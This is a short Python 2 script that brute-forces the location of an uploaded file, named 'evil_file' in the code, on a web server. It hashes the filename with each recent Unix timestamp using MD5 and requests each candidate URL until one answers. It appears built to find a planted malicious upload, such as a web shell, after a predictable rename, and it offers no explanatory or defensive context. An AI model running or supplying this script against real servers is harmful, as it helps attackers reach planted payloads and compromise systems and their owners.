from datetime import datetime
import time
import pytz
import hashlib
import sys
from urllib2 import urlopen

evil_file = str(sys.argv[1]) 
extension = str(sys.argv[2])
base_url = str(sys.argv[3])

tz_LD = pytz.timezone("Europe/London")
time_LD = datetime.now(tz_LD)
unixtime = int(time.mktime(time_LD.timetuple()))

def check_file(file_name, extension, url):
	for offset in range(300):
		pre_encode = evil_file + str((unixtime - offset))
		encoded = hashlib.md5(pre_encode).hexdigest()
		url =  base_url + "/" + encoded + "." + extension
		print "Testing: " + url 	
		try:
			print urlopen(url).getcode() 
			print "Found: " + url
			break
		except:
			pass

check_file(evil_file, extension, base_url)
